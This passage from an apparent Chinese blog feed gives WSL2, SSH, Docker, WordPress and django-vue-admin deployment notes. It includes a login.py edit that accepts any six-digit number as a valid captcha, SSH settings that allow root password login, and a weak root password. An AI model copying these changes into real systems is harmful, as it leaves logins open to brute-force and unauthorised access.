&gt;“PowerShell” &gt;单击右键 &gt;“以管理员身份运行”），然后输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart<br></code></pre></td></tr></table></figure><h5 id="2-启用虚拟机功能"><a href="#2-启用虚拟机功能" class="headerlink" title="2 启用虚拟机功能"></a>2 启用虚拟机功能</h5><p>安装 WSL 2 之前，必须启用“虚拟机平台”可选功能。 计算机需要虚拟化功能才能使用此功能。</p><p>以管理员身份打开 PowerShell 并运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart<br></code></pre></td></tr></table></figure><p><strong>重新启动计算机，以完成 WSL 安装并更新到 WSL 2。</strong></p><p>安装完重启后在PowerShell中设置默认为WSL2：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wsl --set-default-version 2<br></code></pre></td></tr></table></figure><h5 id="3-安装所选的-Linux-分发"><a href="#3-安装所选的-Linux-分发" class="headerlink" title="3  安装所选的 Linux 分发"></a>3  安装所选的 Linux 分发</h5><p>在MicroSoft Store中搜索并下载想要使用的linux版本，我这里使用的ubuntu 20版本（或22版本）</p><p><strong>4  运行WSL</strong></p><p>终端使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wsl -h # 查看命令help<br>wsl # 运行wsl<br></code></pre></td></tr></table></figure><h1 id="2、进入WSL-安装开启ssh远程"><a href="#2、进入WSL-安装开启ssh远程" class="headerlink" title="2、进入WSL 安装开启ssh远程"></a>2、进入WSL 安装开启ssh远程</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo passwd root   #设置root账号密码。根据提示输入root密码即可。<br>12345678<br>su User  #切换账号. root账号是 # 结尾，非root账号是 $结尾<br><br>// 更新环境<br>sudo apt-get update<br><br>ifconfig # 如果没有就执行下面的<br>sudo apt-get install net-tools<br><br>// 安装ssh<br>sudo apt-get install openssh-server<br><br>sudo apt-get install openssh-server<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑sshd_config文件</span><br>vim /etc/ssh/sshd_config<br><br>Port 2222   #设置ssh的端口号, 由于22在windows中有别的用处, 尽量不修改系统的端口号<br>PermitRootLogin yes   # 可以root远程登录<br>PasswordAuthentication yes     # 密码验证登录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置SSH的端口号,尽量避免与Windows端口号冲突</span><br>Port 2345<br><span class="hljs-meta prompt_">#</span><span class="language-bash">允许远程登录</span><br>PermitRootLogin yes   <br><span class="hljs-meta prompt_">#</span><span class="language-bash">使用密码登录</span><br>PasswordAuthentication yes<br><span class="hljs-meta prompt_">#</span><span class="language-bash">SSH登录时的用户名字</span><br>AllowUsers wsl_username<br><br>安装ssh<br>apt-get install ssh<br><br>开启 ssh<br>/etc/init.d/ssh start<br><br>出现* Starting OpenBSD Secure Shell server sshd报错就<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh-keygen -A</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">/etc/init.d/ssh start</span><br>可以远程连接了<br>sudo ps -e | grep ssh # 输入查看有没有启动成功<br>如果显示对应的端口号，就说明启动成功了<br><br></code></pre></td></tr></table></figure><h1 id="3、更新服务器软件源（阿里云源）并更新软件"><a href="#3、更新服务器软件源（阿里云源）并更新软件" class="headerlink" title="3、更新服务器软件源（阿里云源）并更新软件"></a><strong>3、更新服务器软件源（阿里云源）并更新软件</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用 root 权限登录，后续输入密码</span><br>sudo -i<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">接下来备份当前源，输入以下命令</span><br>cp /etc/apt/sources.list /etc/apt/sources.list.old <br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">这个sources.list文件就是源文件，删除该文件，重新写一个</span><br>rm /etc/apt/sources.list<br>vim /etc/apt/sources.list<br><br></code></pre></td></tr></table></figure><h2 id="更新软件源（阿里云源）并更新软件"><a href="#更新软件源（阿里云源）并更新软件" class="headerlink" title="更新软件源（阿里云源）并更新软件"></a><strong>更新软件源（阿里云源）并更新软件</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用 root 权限登录，后续输入密码</span><br>sudo -i<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">接下来备份当前源，输入以下命令</span><br>cp /etc/apt/sources.list /etc/apt/sources.list.old <br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">这个sources.list文件就是源文件，删除该文件，重新写一个</span><br>rm /etc/apt/sources.list<br>vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><p>复制下面内容，然后单击右键粘贴进去即可，之后按ESC，输入wq保存并退出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs shell">deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># Pre-released source, not recommended.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br> <br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># Pre-released source, not recommended.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># Pre-released source, not recommended.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br> <br>deb http://mirrors.163.com/ubuntu/ jammy main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.163.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># Pre-released source, not recommended.</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">deb-src http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开始更新软件镜像源和软件包</span><br>sudo apt update      <span class="hljs-comment">#更新软件源</span><br>sudo apt upgrade     <span class="hljs-comment">#更新软件包</span><br></code></pre></td></tr></table></figure><h1 id="4、docker-安装"><a href="#4、docker-安装" class="headerlink" title="4、docker 安装"></a>4、docker 安装</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. 先卸载旧版本的docke<br>sudo apt-get remove docker docker-engine docker.io<br>2. 更新一下apt-get源<br>sudo apt-get update<br>3. 安装GPG证书<br><span class="hljs-meta prompt_">#</span><span class="language-bash">别忘了最后的“-”</span><br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>4. 写入软件源信息<br>sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;<br>5. 列出可用版本<br>sudo apt-cache madison docker-ce<br>6. 更新并安装 Docker-CE<br>sudo apt-get update<br>sudo apt-get install docker-ce=5:23.0.5-1~ubuntu.20.04~focal<br>sudo apt-get install docker-ce=5:24.0.4-1~ubuntu.22.04~jammy<br>7. 开启docker服务，查看docker状态<br>sudo service docker start<br>sudo service docker status<br>systemctl restart docker<br>8.使用docker的命令，查看现有镜像和正在运行的容器<br>docker images<br>docker ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker compose安装</span><br>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;<br><br>sudo apt-get update<br>sudo apt-get install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><h3 id="docker-换源"><a href="#docker-换源" class="headerlink" title="docker 换源"></a>docker 换源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost henryhzy]# vim /etc/docker/daemon.json  # 创建或修改 /etc/docker/daemon.json 文件，修改为如下形式<br>&#123;<br>    &quot;registry-mirrors&quot; : [<br>    &quot;https://docker.mirrors.ustc.edu.cn&quot;,<br>    &quot;http://hub-mirror.c.163.com&quot;,<br>    &quot;https://cr.console.aliyun.com/&quot;<br>  ]<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl daemon-reload</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl restart docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker info</span><br></code></pre></td></tr></table></figure><h1 id="5、docker搭建个人博客"><a href="#5、docker搭建个人博客" class="headerlink" title="5、docker搭建个人博客"></a>5、docker搭建个人博客</h1><h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">先输入命令安装docker-compose<br>sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose<br>sudo chmod +x /usr/local/bin/docker-compose<br>sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose<br><br>测试已下版本<br>docker-compose --version<br>显示docker-compose version 1.26.0, build d4451659<br><br>再拉两个镜像<br>docker pull wordpress<br><br>docker pull mysql:5.6<br><br>建一个文件夹放wordpress bolg<br>mkdir -p /wang/wordpress<br></code></pre></td></tr></table></figure><h3 id="vi命令-创建一个docker-compose-yml"><a href="#vi命令-创建一个docker-compose-yml" class="headerlink" title="vi命令 创建一个docker-compose.yml"></a>vi命令 创建一个docker-compose.yml</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim docker-compose.yml<br></code></pre></td></tr></table></figure><h3 id="把下文内容写进docker-compose-yml里面"><a href="#把下文内容写进docker-compose-yml里面" class="headerlink" title="把下文内容写进docker-compose.yml里面"></a>把下文内容写进docker-compose.yml里面</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell">version: &#x27;3&#x27;<br>services:<br>  wordpress:<br>    image: wordpress<br>    restart: always<br>    ports:<br>      - 80:9090<br>    environment:<br>      WORDPRESS_DB_HOST: db<br>      WORDPRESS_DB_USER: exampleuser<br>      WORDPRESS_DB_PASSWORD: examplepass<br>      WORDPRESS_DB_NAME: exampledb<br>    networks:<br>      - wang-net<br>    volumes:<br>      - wordpress:/var/www/html<br><br>  db:<br>    image: mysql:5.6<br>    restart: always<br>    environment:<br>      MYSQL_DATABASE: exampledb<br>      MYSQL_USER: exampleuser<br>      MYSQL_PASSWORD: examplepass<br>      MYSQL_RANDOM_ROOT_PASSWORD: &#x27;1&#x27;<br>    volumes:<br>      - db:/var/lib/mysql<br>    networks:<br>      - wang-net<br><br>volumes:<br>  wordpress:<br>  db:<br>  <br>networks:<br>  wang-net:<br>    driver: bridge<br></code></pre></td></tr></table></figure><h3 id="再执行命令启动这个compose"><a href="#再执行命令启动这个compose" class="headerlink" title="再执行命令启动这个compose"></a>再执行命令启动这个compose</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><h1 id="6、docker配置数据库"><a href="#6、docker配置数据库" class="headerlink" title="6、docker配置数据库"></a>6、docker配置数据库</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>部署</tag>
      
      <tag>wsl</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】djangoAdmin部署记录</title>
    <link href="/2023/12/15/699djangoAdmin%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/12/15/699djangoAdmin%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="部署笔记"><a href="#部署笔记" class="headerlink" title="部署笔记"></a>部署笔记</h1><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><blockquote><p>Python &gt;&#x3D; 3.8.0 (推荐3.9+版本)<br>nodejs &gt;&#x3D; 14.0 (推荐最新)<br>Mysql &gt;&#x3D; 5.7.0 (可选，默认数据库sqlite3，推荐8.0版本)<br>Redis(可选，最新版)</p></blockquote><h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><h3 id="拉代码部署"><a href="#拉代码部署" class="headerlink" title="拉代码部署"></a>拉代码部署</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉代码</span><br>进入后端项目目录:cd backend<br>在项目根目录中，复制 ./conf/env.example.py 文件为一份新的到 ./conf/env.py 下，并重命名为env.py<br>在 env.py 中配置数据库信息(默认数据库为sqlite3，测试演示可忽略此步骤)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker 部署mysql</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker创建数据库 DATABASE_NAME = <span class="hljs-string">&#x27;django-vue-admin&#x27;</span> <span class="hljs-comment"># mysql 时使</span></span><br>安装依赖环境: pip3 install -r requirements.txt<br>如果有碰到mysqlclient 无法安装的时候，查一下手册，mac是要brew install mysql <br>执行迁移命令: python3 manage.py makemigrations python3 manage.py migrate<br>初始化数据: python3 manage.py init<br>初始化省市县数据: python3 manage.py init_area<br>启动项目: python3 manage.py runserver 0.0.0.0:8000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker 部署mysql</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker创建数据库 DATABASE_NAME = <span class="hljs-string">&#x27;django-vue-admin&#x27;</span> <span class="hljs-comment"># mysql 时使用</span></span><br><br></code></pre></td></tr></table></figure><h3 id="改验证码逻辑"><a href="#改验证码逻辑" class="headerlink" title="改验证码逻辑"></a>改验证码逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在 login.py文件的第85行 改</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> self.image_code <span class="hljs-keyword">and</span> ((<br>                                                self.image_code.response == captcha<br>                                                <span class="hljs-keyword">or</span> self.image_code.challenge == captcha<br>                                        ) <span class="hljs-keyword">or</span> captcha.isdigit() <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(captcha) == <span class="hljs-number">6</span>):<br>                    self.image_code <span class="hljs-keyword">and</span> self.image_code.delete()<br>                <span class="hljs-keyword">else</span>:<br>                    self.image_code <span class="hljs-keyword">and</span> self.image_code.delete()<br>                    <span class="hljs-keyword">raise</span> CustomValidationError(<span class="hljs-string">&quot;图片验证码错误&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="再启服务"><a href="#再启服务" class="headerlink" title="再启服务"></a>再启服务</h3><p>执行迁移命令: python3 manage.py makemigrations python3 manage.py migrate<br>初始化数据: python3 manage.py init<br>初始化省市县数据: python3 manage.py init_area<br>启动项目: python3 manage.py runserver 0.0.0.0:8000</p><p>访问地址：[<a href="http://localhost:8000/">http://localhost:8000</a></p><h1 id="前端部署"><a href="#前端部署" class="headerlink" title="前端部署"></a>前端部署</h1><ol><li>进入前端项目目录 <code>cd web</code></li><li>安装依赖 <code>npm install --registry= https://registry.npmmirror.com</code><ol><li>注意一下npm的源 npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a></li><li>你可以使用以下命令来查看当前npm的下载源设置：npm config get registry</li><li>安装nodejs &gt;&#x3D; 14.0 (推荐最新)</li></ol></li><li>启动服务 <code>npm run dev</code></li></ol><h1 id="访问项目"><a href="#访问项目" class="headerlink" title="访问项目"></a>访问项目</h1><ul><li>访问地址：<a href="http://localhost:8080/">http://localhost:8080 (opens new window)</a>(默认为此地址，如有修改请按照配置文件1)</li><li>账号：<code>superadmin</code> 密码：<code>admin123456</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>部署</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Golang】go语言之并发编程基础（goroutine、channel、SELECT）</title>
    <link href="/2023/12/07/802go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%88goroutine%E3%80%81channel%E3%80%81SELECT%EF%BC%89/"/>
    <url>/2023/12/07/802go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%88goroutine%E3%80%81channel%E3%80%81SELECT%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h1><h2 id="go中的串行和并行还有并发的概念"><a href="#go中的串行和并行还有并发的概念" class="headerlink" title="go中的串行和并行还有并发的概念"></a>go中的串行和并行还有并发的概念</h2><ul><li>串行（Sequential）：<ul><li>串行是一种<strong>执行方式</strong>，串联行走，按照顺序逐一的执行任务或者操作，</li><li>在串行执行中，每个任务必须等待前一个任务执行完了之后才能开始执行</li><li>场景：串行执行通常用于单核或者单线程环境，其中一次只能执行一个任务，意味着任务要找现行顺序执行，一个接一个，直到所有的任务都完成</li><li>串行执行通常具有可预测行，因为任务的执行顺序是确定的，</li><li>缺点就是在多核系统中，无法充分的利用硬件资源</li></ul></li><li>并行（Parallel）：<ul><li>并行也是一种<strong>执行方式</strong> ，</li><li>多个任务或者操作可以同时的执行，不必等待前一个任务完成，</li><li>充分利用多核处理器或者多线程环境的优势</li></ul></li><li>并发（Concurrency）：<ul><li>并发是一个更广泛的<strong>概念</strong>，在同一时间段内处理多个任务，但不一定要求同时执行。在并发中，任务可以交替执行，每个任务都有自己的执行周期，并发通常涉及的是多个独立的执行线程、进程或者协程。</li><li>并发不一定需要多核处理器，它可以在单核处理器上模拟通过快速切换执行线程来实现。</li><li>并发通常用于提高系统的吞吐量、资源利用率和响应性，特别是IO密集型应用中。</li><li>并发任务之间可能需要协调、同步和共享数据，因此需要小心处理并发问题，如竞争条件和死锁等</li></ul></li><li>总结：<ul><li>串行是指按顺序执行任务的方法，不涉及多个任务之间的交替执行</li><li>并行是多个任务同时执行的方式，通常需要多核处理器或多线程环境</li><li>并发是多个任务在同一时间段内处理的方式，可以是交替执行，通常涉及多线程或协程、并需要处理并发相关问题。</li></ul></li></ul><h2 id="【拓展】并发模型"><a href="#【拓展】并发模型" class="headerlink" title="【拓展】并发模型"></a>【拓展】并发模型</h2><ul><li>主流并发模型无外乎三种<ul><li>1、多线程：每个线程一次处理一个请求，线程越多可并发处理的请求数就越多，<ul><li>但是在高并发下，多线程的开销会比较大</li></ul></li><li>2、协程：无需抢占式的调度，开销小，可以有效的提高线程的并发性，从而避免了线程的缺点那部分</li><li>3、基于异步回调的IO模型：异步编程，当遇到密集IO的时候，等待，让其他程序继续跑</li></ul></li></ul><h2 id="goroutine的基本概念"><a href="#goroutine的基本概念" class="headerlink" 